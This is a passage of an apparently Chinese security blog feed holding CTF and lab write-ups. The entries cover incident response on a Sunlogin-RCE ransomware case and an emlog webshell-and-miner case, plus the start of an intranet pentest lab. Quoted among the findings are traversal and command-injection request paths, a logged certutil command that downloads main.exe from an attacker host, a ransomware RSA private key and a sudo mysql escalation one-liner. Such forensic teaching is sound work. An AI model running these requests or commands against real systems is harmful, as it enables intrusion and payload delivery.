src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717210745653.png" alt="image-20240717210745653"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Firefox/110.0&#125;</span><br></pre></td></tr></table></figure><h3 id="3-请提交攻击者目录扫描所使用的工具名称"><a href="#3-请提交攻击者目录扫描所使用的工具名称" class="headerlink" title="3.请提交攻击者目录扫描所使用的工具名称"></a>3.请提交攻击者目录扫描所使用的工具名称</h3><p>查看日志记录中UA头  发现  大量的Fuzz Faster U Fool <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717210434635.png" alt="image-20240717210434635"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可知道 攻击者从一开始 就一直Fuzz Faster U Fool v1.5.0扫</span><br><span class="line">flag&#123;Fuzz Faster U Fool&#125;</span><br></pre></td></tr></table></figure><h3 id="4-找到攻击者写入的恶意后门文件，提交文件名（完整路径）"><a href="#4-找到攻击者写入的恶意后门文件，提交文件名（完整路径）" class="headerlink" title="4.找到攻击者写入的恶意后门文件，提交文件名（完整路径）"></a>4.找到攻击者写入的恶意后门文件，提交文件名（完整路径）</h3><p>使用D盾进行扫描 <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717212122746.png" alt="image-20240717212122746"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\.x.php&#125;</span><br></pre></td></tr></table></figure><h3 id="5-找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）"><a href="#5-找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）" class="headerlink" title="5.找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）"></a>5.找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717212429914.png" alt="image-20240717212429914"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\usr\themes\default\post.php&#125;</span><br></pre></td></tr></table></figure><h3 id="6-请指出可疑进程采用的自动启动的方式，启动的脚本的名字-flag-1-exe"><a href="#6-请指出可疑进程采用的自动启动的方式，启动的脚本的名字-flag-1-exe" class="headerlink" title="6.请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}"></a>6.请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}</h3><p>x.bat指向C:\Windows\360.exe <img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717213057355.png" alt="image-20240717213057355"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717212958461.png" alt="image-20240717212958461"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;x.bat&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第四章-windows实战-向日葵</title>
      <link href="/2024/07/17/%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98-%E5%90%91%E6%97%A5%E8%91%B5/"/>
      <url>/2024/07/17/%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98-%E5%90%91%E6%97%A5%E8%91%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">by:https://xj.edisec.net/challenges/64</span><br><span class="line">服务器场景操作系统 Windows</span><br><span class="line">Administrator xj@123456</span><br><span class="line">1.通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为 为多少,将黑客首次攻击成功的时间为 作为 FLAG 提交(2028-03-26 08:11:25.123);</span><br><span class="line">2.通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少,将黑客攻击 IP 作为 FLAG 提交;</span><br><span class="line">3.通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为,将黑客托管恶意程序 IP 作为 FLAG 提交;</span><br><span class="line">4.找到黑客解密 DEC 文件,将黑客DEC 文件的 md5 作为 FLAG 提交;</span><br><span class="line">5.通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;</span><br></pre></td></tr></table></figure><p>攻击者利用的漏洞为CNVD-2022-10207<br>可能利用如下请求触发<br><strong>目录遍历攻击</strong>：尝试访问和下载敏感文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</span><br></pre></td></tr></table></figure><p><strong>命令注入攻击</strong>：通过 URL 参数执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+whoami</span><br></pre></td></tr></table></figure><blockquote><p>相关漏洞参考：<br><a href="https://www.adminxe.com/3445.html">【漏洞复现】Sunlogin RCE 向日葵远程代码执行 – Adminxe’s Blog</a></p></blockquote><h3 id="1-通过本地-PC-RDP到服务器并且找到黑客首次攻击成功的时间为-为多少-将黑客首次攻击成功的时间为-作为-FLAG-提交-2028-03-26-08-11-25-123"><a href="#1-通过本地-PC-RDP到服务器并且找到黑客首次攻击成功的时间为-为多少-将黑客首次攻击成功的时间为-作为-FLAG-提交-2028-03-26-08-11-25-123" class="headerlink" title="1.通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为 为多少,将黑客首次攻击成功的时间为 作为 FLAG 提交(2028-03-26 08:11:25.123);"></a>1.通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为 为多少,将黑客首次攻击成功的时间为 作为 FLAG 提交(2028-03-26 08:11:25.123);</h3><p>查看向日葵的日志文件<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717103008409.png" alt="image-20240717103008409"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717111718866.png" alt="image-20240717111718866"></p><p>192.168.31.45正尝试着目录遍历</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717113420000.png" alt="image-20240717113420000"></p><p>后面尝试着RCE 发现存在session</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024-03-26 10:16:25.585&#125;</span><br></pre></td></tr></table></figure><h3 id="2-通过本地-PC-RDP到服务器并且找到黑客攻击的-IP-为多少-将黑客攻击-IP-作为-FLAG-提交"><a href="#2-通过本地-PC-RDP到服务器并且找到黑客攻击的-IP-为多少-将黑客攻击-IP-作为-FLAG-提交" class="headerlink" title="2.通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少,将黑客攻击 IP 作为 FLAG 提交;"></a>2.通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少,将黑客攻击 IP 作为 FLAG 提交;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2024-03-26 10:16:25.585- Info  -[Acceptor][HTTP] new RC HTTP connection 192.168.31.45:64247, path: /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+whoami, version: HTTP/1.1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.31.45&#125;</span><br></pre></td></tr></table></figure><h3 id="3-通过本地-PC-RDP到服务器并且找到黑客托管恶意程序-IP-为-将黑客托管恶意程序-IP-作为-FLAG-提交"><a href="#3-通过本地-PC-RDP到服务器并且找到黑客托管恶意程序-IP-为-将黑客托管恶意程序-IP-作为-FLAG-提交" class="headerlink" title="3.通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为,将黑客托管恶意程序 IP 作为 FLAG 提交;"></a>3.通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为,将黑客托管恶意程序 IP 作为 FLAG 提交;</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717113706557.png" alt="image-20240717113706557"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内容为</span><br><span class="line">/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe certutil -urlcache -split -f http://192.168.31.249/main.exe, plugin:check, session:sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">解释：</span><br><span class="line">certutil: 这是一个Windows命令行工具，通常用于处理证书和加密服务。</span><br><span class="line">-urlcache: 这是certutil命令的一个选项，用于指示certutil从URL下载文件并将其缓存在系统中。</span><br><span class="line">-split: 这个选项告诉certutil将下载的文件拆分成多个部分。</span><br><span class="line">-f: 这个选项用于覆盖现有文件，如果存在同名文件，则强制覆盖。</span><br><span class="line">http://192.168.31.249/main.exe: 这是要下载的文件的URL地址，指示certutil下载main.exe文件并将其缓存在系统中</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.31.249&#125;</span><br></pre></td></tr></table></figure><h3 id="4-找到黑客解密-DEC-文件-将黑客DEC-文件的-md5-作为-FLAG-提交"><a href="#4-找到黑客解密-DEC-文件-将黑客DEC-文件的-md5-作为-FLAG-提交" class="headerlink" title="4.找到黑客解密 DEC 文件,将黑客DEC 文件的 md5 作为 FLAG 提交;"></a>4.找到黑客解密 DEC 文件,将黑客DEC 文件的 md5 作为 FLAG 提交;</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717115231770.png" alt="image-20240717115231770"><br>尝试在log日志中搜索DEC 但是 没有搜索到<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717115408724.png" alt="image-20240717115408724"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe echo 647224830 &gt; qq.txt</span><br></pre></td></tr></table></figure><p>发现攻击者尝试将一串数字写入qq.txt</p><p>尝试在QQ里搜集信息<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717115600998.png" alt="image-20240717115600998"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717115715314.png" alt="image-20240717115715314"><br>将文件下载到本地 将文件进行md5<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717115957251.png" alt="image-20240717115957251"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5ad8d202f80202f6d31e077fc9b0fc6b&#125;</span><br></pre></td></tr></table></figure><h3 id="5-通过本地-PC-RDP到服务器并且解密黑客勒索软件-将桌面加密文件中关键信息作为-FLAG-提交"><a href="#5-通过本地-PC-RDP到服务器并且解密黑客勒索软件-将桌面加密文件中关键信息作为-FLAG-提交" class="headerlink" title="5.通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;"></a>5.通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717103120191.png" alt="image-20240717103120191"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717120050372.png" alt="image-20240717120050372"></p><h4 id="DEC-pem"><a href="#DEC-pem" class="headerlink" title="DEC.pem"></a>DEC.pem</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA Private key-----</span><br><span class="line">MIICXQIBAAKBgQDWQqpkHRKtRu66MjTrNZC13A6rIlGaJBd/FYBy4ifiITasCnQE</span><br><span class="line">J9aRTIYQsM5iincecnvY8xGYMg5pVTp6P4fxS4/+1bAEciRXSTCmLI8FeDd3sjOc</span><br><span class="line">HTw82sG0hfnnb0b/LFhbOCk7BgLnpwvSy5za/dtVQFSDbQbQuTBp029AKwIDAQAB</span><br><span class="line">AoGBAKh6952NtvgGhQZpIG+sSUSX6/jqHZzFsKw/7idoatBIKcOS3LO/19udfvZ0</span><br><span class="line">8XVPSGfqwjRQvo8dHXP6juc+Odg1XOLPw4fjjJz9b9dLKCKwtIU3CwA1AmuhYNGp</span><br><span class="line">1OXlHLyUaNVTN3TZN9Dn7txD4gOvLIirqbmhzy/N7PdPF5ThAkEA4MB++5DSY7Kv</span><br><span class="line">MO1uHuxTr/jRy6754Mzgo0fpLBXSB13/nLMxRA6QEbigoAFpsFd36EYMKzftbezB</span><br><span class="line">gx2nphvLUwJBAPQMv730MqCWjaCPLgYRV+oMU6OnOMs6+ALql+I1eVqVfBAt+5De</span><br><span class="line">HMxY7mWdaR9pofzuz+6KkmwRHqKSVw45dMkCQFJ68l76B+vkoFxxVe9tRU0YIE4C</span><br><span class="line">mdtA9NOXSWAPZfOkMHFeZZ8XRRHr0q7FtfasMuoAAuk9bhngQCgREvxnyNcCQGnt</span><br><span class="line">trQecHMfpe2Q+CsOEBi4rP0VsiMUP14UsUQwbbIRvD3Rl6WzotBXsXJNtrk5wmPk</span><br><span class="line">zD//ybo6XA+4cSztZ3ECQQC92ck1XJm7V12SOFqHcNXFoS8tFvgNQXNEahmhJ2wb</span><br><span class="line">xTo0VwUhCeG1n8X5PqRn6Rcsh8YQAt924YrWtcTxrg8g</span><br><span class="line">-----END RSA Private key-----</span><br></pre></td></tr></table></figure><h4 id="desktop-ini"><a href="#desktop-ini" class="headerlink" title="desktop.ini"></a>desktop.ini</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">onEDpnamFbekYxixEQ30W6ZcEXjCUrKHP+APxzuJQZD8bS+4V5Tu+7XmxT24EuNSfoGnda+obAmy2d1E2WT/0MmT4VHNIUyX15JuOcd477c7Zj5v3qtzoJk8Rmtub9RL0vDDjwYKPzyS4wxSyqhRfggenLiSFxhrY32nnf42W30=</span><br><span class="line"></span><br><span class="line">Your files have been encrypted</span><br><span class="line"></span><br><span class="line">X6cNmnKCuxdTl+f5XLhmYY4oFovJGebCmpP94be/VVqNQe0cLJm3RtX84MO98b8fI0zY50xC4OjK5aHOz2zFxCvxHygFR+rIgL0XC2rruzCAukTLJqjjbNRH06alTMMdrxhRVdrC73PMBQBweyProof4ZYNZ4YHnZrej6Vq/Ipr2xeUqamHkysjFPNqA8DVDuXYYlTUuDzZdPZpWM3IDbUDMNi4ilrPEe47IXAxd8nrqTHgX+3X7YiOjuayqK8li2c2xMXoXuSce+rAeNsWHv9SUEqUTP+MJHll7MGYLZSvYpkCVacP3joKJoI/bfoVRX8FlCuCMkicFnTawY0ZxKiX7f+0Wv+KYP0st5SYjWhMWklNSEEG7TH24wZeCANjf</span><br></pre></td></tr></table></figure><h4 id="baoleiji-txt"><a href="#baoleiji-txt" class="headerlink" title="baoleiji.txt"></a>baoleiji.txt</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">N2xTZ2Bsn2Y5lve7KZ36bgsFjqncBs55VO0zkeEIr5Iga/kbegA0BAstotBWnZ16+trNfkzl3apUobodMkC8covEo22p+kWAyVjMRyJ98EQ4Pspr/Y5HIuH0xuvPa82j7b0AMJHkyd2viuymI/mrxjJk2X0xlEE4YVioMLd22+w=</span><br><span class="line"></span><br><span class="line">Your files have been encrypted</span><br><span class="line"></span><br><span class="line">0sWK8adKSGh1Xaxo6n1mZFoyNDYVokXwkBhxnzxU+MEJIV44u48SdOiFzWLn849hObaP6z26lLtMnXaDUnAPuMh+nF2hw9RoAsur7KYxE8/iY/y4jOEBsHT5wvQldcNfntrDyMUCvrWTUHl2yapUmaIIf2rZsNsqMVJ9puZzp58+FJmulyC7R1C2yoP1jHhsdOkU7htbzUWWsm2ybL+eVpXTFC+i6nuEBoAYhv2kjSgL8qKBFsLKmKQSn/ILRPaRYDFP/srEQzF7Y4yZa4cotpFTdGUVU547Eib/EaNuhTyzgOGKjXl2UYxHM/v0c3lgjO7GDA9eF3a/BBXPAgtK126lUfoGK7iSAhduRt5sRP4=</span><br></pre></td></tr></table></figure><p>使用在线平台进行解密：<br><a href="https://the-x.cn/cryptography/Rsa.aspx">RSA在线加密&#x2F;在线解密 公钥加密,公钥解密,私钥加密,私钥解密</a><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717152421258.png" alt="image-20240717152421258"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717152515793.png" alt="image-20240717152515793"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">分别得到</span><br><span class="line">KBFKKYZKCBBUZKEC</span><br><span class="line">NXVJSTQUAPGTXKSX</span><br></pre></td></tr></table></figure><p>再通过aes进行解密<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717151849050.png" alt="image-20240717151849050"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240717151302867.png" alt="image-20240717151302867"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@suanve</span><br><span class="line">时间是连续的，年份只是人类虚构出来用于统计的单位，2024年第一天和2023年最后一天，</span><br><span class="line">不会有任何本质区别。你的花呗，你的客户,你的体检报告，窗外的寒风，都不会因为这是新的一年，</span><br><span class="line">而停下对你的毒打。</span><br><span class="line">GIVE YOU FLAG!!!!!</span><br><span class="line">flag&#123;EDISEC_15c2e33e-b93f-452c-9523-bbb9e2090cd1&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第四章-Windows实战-emlog</title>
      <link href="/2024/07/16/%E7%AC%AC%E5%9B%9B%E7%AB%A0-Windows%E5%AE%9E%E6%88%98-emlog/"/>
      <url>/2024/07/16/%E7%AC%AC%E5%9B%9B%E7%AB%A0-Windows%E5%AE%9E%E6%88%98-emlog/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">by：https://xj.edisec.net/challenges/61</span><br><span class="line">服务器场景操作系统 Windows</span><br><span class="line">服务器账号密码 administrator xj@123456</span><br><span class="line">1.通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;</span><br><span class="line">2.通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</span><br><span class="line">3.通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;</span><br><span class="line">4.通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;</span><br></pre></td></tr></table></figure><h3 id="1-通过本地-PC-RDP到服务器并且找到黑客植入-shell-将黑客植入-shell-的密码-作为-FLAG-提交"><a href="#1-通过本地-PC-RDP到服务器并且找到黑客植入-shell-将黑客植入-shell-的密码-作为-FLAG-提交" class="headerlink" title="1.通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;"></a>1.通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;</h3><p>使用D盾扫描网站目录<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240716170742295.png" alt="image-20240716170742295"></p><p>得到已知后门<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240716170934562.png" alt="image-20240716170934562"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;rebeyond&#125;</span><br></pre></td></tr></table></figure><h3 id="2-通过本地-PC-RDP到服务器并且分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交"><a href="#2-通过本地-PC-RDP到服务器并且分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交" class="headerlink" title="2.通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;"></a>2.通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240716171239307.png" alt="image-20240716171239307"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240716171312084.png" alt="image-20240716171312084"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240716171445508.png" alt="image-20240716171445508"></p><p>定位到shell.php  然后 在日志文件中搜索”shell.php” 定位到192.168.126.1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.126.1&#125;</span><br></pre></td></tr></table></figure><h3 id="3-通过本地-PC-RDP到服务器并且分析黑客的隐藏账户名称-将黑客隐藏账户名称作为-FLAG-提交"><a href="#3-通过本地-PC-RDP到服务器并且分析黑客的隐藏账户名称-将黑客隐藏账户名称作为-FLAG-提交" class="headerlink" title="3.通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;"></a>3.通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;</h3><p>隐藏用户直接使用<code>net user</code>是查不出来<br>可以进计算机管理 查本地用户和组 或者  直接进用户目录看看</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240716172140342.png" alt="image-20240716172140342"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240716172336082.png" alt="image-20240716172336082"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hacker138&#125;</span><br></pre></td></tr></table></figure><h3 id="4-通过本地-PC-RDP到服务器并且分析黑客的挖矿程序的矿池域名-将黑客挖矿程序的矿池域名称作为-仅域名-FLAG-提交"><a href="#4-通过本地-PC-RDP到服务器并且分析黑客的挖矿程序的矿池域名-将黑客挖矿程序的矿池域名称作为-仅域名-FLAG-提交" class="headerlink" title="4.通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;"></a>4.通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240716172423828.png" alt="image-20240716172423828"><br>看图标  可以显然知道是一个python打包的exe文件<br>使用pyinstxtractor尝试进行解包<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240716191031627.png" alt="image-20240716191031627"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240716191106861.png" alt="image-20240716191106861"><br>可以使用在线平台进行pyc进行反编译<br>但是 都失败了、、、<br>实在不行就拿记事本硬看了<br>推荐在线反编译平台：<br><a href="https://toolkk.com/tools/pyc-decomplie">pyc反编译 - 工具匠 (toolkk.com)</a><br><a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a><br><a href="https://www.lddgo.net/string/pyc-compile-decompile">在线Python pyc文件编译与反编译 (lddgo.net)</a></p><p>工具可以使用：<br><a href="https://blog.csdn.net/tianya_lu/article/details/129825551">uncompyle6安装使用方法-CSDN博客</a><br><a href="https://blog.csdn.net/qq_63585949/article/details/127080253?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-127080253-blog-132512142.235%5Ev43%5Epc_blog_bottom_relevance_base2&spm=1001.2101.3001.4242.2&utm_relevant_index=4">Python 反编译：pycdc工具的使用-CSDN博客</a></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240716201834342.png" alt="image-20240716201834342"></p><p>这回在线平台和工具的报错一致、、、<br>直接拿记事本查看了、、、<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240716202012992.png" alt="image-20240716202012992"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;wakuang.zhigongshanfang.top&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Initial</title>
      <link href="/2024/07/13/Initial/"/>
      <url>/2024/07/13/Initial/</url>
      
        <content type="html"><![CDATA[<h2 id="靶标介绍："><a href="#靶标介绍：" class="headerlink" title="靶标介绍："></a>靶标介绍：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">by:https://yunjing.ichunqiu.com/major/detail/1077</span><br><span class="line">Initial是一套难度为简单的靶场环境</span><br><span class="line">完成该挑战可以帮助玩家初步认识内网渗透的简单流程。</span><br><span class="line">该靶场只有一个flag，各部分位于不同的机器上。</span><br><span class="line">靶场IP:39.99.254.114</span><br></pre></td></tr></table></figure><h2 id="fscan探针"><a href="#fscan探针" class="headerlink" title="fscan探针"></a>fscan探针</h2><p><code>fscan.exe -h 39.99.254.114</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095025538.png" alt="image-20240713095025538"></p><h3 id="tp5-0-23"><a href="#tp5-0-23" class="headerlink" title="tp5.0.23"></a>tp5.0.23</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095110220.png" alt="image-20240713095110220"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">存在tp.5.0.23RCE</span><br></pre></td></tr></table></figure><p>TP利用工具 一键getshell</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095157853.png" alt="image-20240713095157853"></p><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095448561.png" alt="image-20240713095448561"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">得到低权限用户</span><br><span class="line">mysql 可以进行免密使用</span><br><span class="line">可以使用 mysql 命令暂时获取 root 权限</span><br><span class="line">想要执行其他命令，可以使用 mysql -e 模式</span><br></pre></td></tr></table></figure><p><code>sudo mysql -e &#39;\! find / -name &quot;flag*&quot;&#39;</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095852910.png" alt="image-20240713095852910"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713100022716.png" alt="image-20240713100022716"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.</span><br><span class="line">flag01: flag&#123;60b53231-</span><br></pre></td></tr></table></figure><h3 id="内网探测"><a href="#内网探测" 